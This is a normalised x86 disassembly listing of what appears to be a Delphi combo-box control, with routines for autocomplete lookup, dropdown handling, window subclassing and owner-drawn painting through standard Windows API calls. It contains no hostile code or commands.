mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e284
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43e2a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43e81c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_449264
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ccf0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44e2e0
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_4232e0
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_423fac
call sub_4232e0
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_423fe8
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44cc5c
test al al
jne r-xdata
mov eax ebx
call sub_43e284
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_43e2a8
jmp r-xdata
sub_43e92a
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_43ea88
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ea8f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
jmp [ eax * 4 + jump_table_43e958 ]
mov eax edi
mov si 0xffe9
call sub_40348c
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_40348c
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_40348c
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448b24
mov eax edi
mov si 0xffeb
call sub_40348c
mov eax edi
mov si 0xffb2
call sub_40348c
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_40348c
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44da60
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44db4c
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_44f2dc
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_44f2dc
push eax
call PostMessageA
jmp r-xdata
sub_43eabc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43eb65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_4476e8
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_4243a0
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eb6c
lea eax [ ebp - 0x14 ]
call sub_404008
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_4245a4
sub_43eb98
push esi
push edi
mov esi eax
mov eax esi
call sub_44abb0
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_43ebc0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_43ec14
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_40348c
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_43ec40
push ebx
mov ebx eax
mov eax ebx
call sub_44c294
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_43ec78
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_43ed0e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ed15
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_43ed15
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_43ed34
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_43ed64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ede3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43edea
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_43edf0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43ee30
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_43ee79
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ee80
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_43ee88
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43e0c4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403260
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_43ef0c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403290
mov eax [ esi + 0x278 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43e1b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_43ef48
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_44c87c
sub_43efac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c168
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c094
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_43f00d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_43ec40
mov eax ebx
call sub_44f2dc
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403290
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_44f2dc
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_43f150
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_44c678
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43f1a0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_423fe8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_43f1f4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_43f220
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f2dc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448af4
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_404568
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_448b24
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406b80
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f2e3
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_43f2e8
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f6a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e2c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f6a7
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x44 ]
call sub_404008
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40402c
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_448af4
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_40405c
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404008
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_43f1f4
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_43f220
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042c8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40c144
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_448af4
mov eax [ ebp - 0x38 ]
call sub_4042c8
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40348c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e284
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042c8
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404568
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042c8
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404568
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_448af4
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43e2a8
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_43f1f4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e284
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40c144
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_4041f0
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_404314
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_404528
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_4041f0
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_404314
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43e2a8
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404528
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_404528
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_404314
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_448b24
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406b80
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_448af4
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_40405c
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43f6b0
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_4041f0
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_404314
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_43f6b0
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_43f6b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f865
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4042c8
test eax eax
jne r-xdata
mov eax esi
call sub_4044c8
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_40348c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f86c
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_40402c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_40405c
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_4042c8
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_404528
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404314
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_448b24
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x1c ]
call sub_4042c8
push eax
mov eax esi
call sub_4042c8
pop edx
call sub_406b80
push eax
push 0x0
push 0x142
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_40348c
mov eax ebx
mov si 0xffb2
call sub_40348c
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_43f898
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_424934
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_4247d4
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_4247f0
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_4243a0
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423fb4
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4237e8
xor edx edx
mov eax [ esi + 0x208 ]
call sub_424934
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_43f970
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_43f99c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a178
mov eax ebx
call sub_448d1c
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45f870
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44919c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_448d2c
sub_43fa14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_43e81c
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_423fe8
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_43fa70
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44d46c
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fc99
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4476d0
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
